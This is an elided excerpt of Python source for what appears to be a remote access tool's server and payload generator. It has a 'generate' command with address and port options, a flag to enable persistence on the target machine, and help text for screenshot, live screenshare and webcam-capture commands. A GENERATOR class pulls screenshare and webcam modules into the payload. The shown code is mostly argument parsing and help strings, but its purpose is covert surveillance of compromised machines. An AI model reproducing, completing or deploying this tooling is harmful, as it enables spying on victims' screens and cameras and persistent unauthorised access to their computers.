...
usage: python3 server.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
    ...
    -per, --persistence  Enable persistence on target machine
...
class PULL:
    ...
    def help_c_screenshot(self):
        ...
        print("$ screenshot")
        sys.stdout.write("\n")
    def help_c_screenshare(self):
        sys.stdout.write("\n")
        print("Info       : Screenshare the current screen in real time!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ screenshare")
        sys.stdout.write("\n")
    def help_c_webcam(self):
        sys.stdout.write("\n")
        print("Info       : Capture webcam image and save it on server!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ webcam")
        sys.stdout.write("\n")
...
class GENERATOR:
    ...
    def __init__(self, prs):
        ...
        self.v_screenshare = self.get_screenshare()
    ...
    def get_screenshot(self):
        ...
        fl.close()
        return data
    def get_screenshare(self):
        topen = os.path.join(self.pather, 'screenshare.py')
        fl = open(topen, encoding='utf-8')
        ...
        return data
    def get_webcam(self):
        topen = os.path.join(self.pather, 'webcam.py')
        fl = open(topen, encoding='utf-8')
...
def main():
    ...
    parser.add_argument('-p', '--port'   , dest="port"   , default=9001 , type=int, help="Port to Bind to")
    ...
    parser.add_argument('-per', '--persistence', dest="persistence", default=False, action="store_true", help="Enable persistence on target machine")
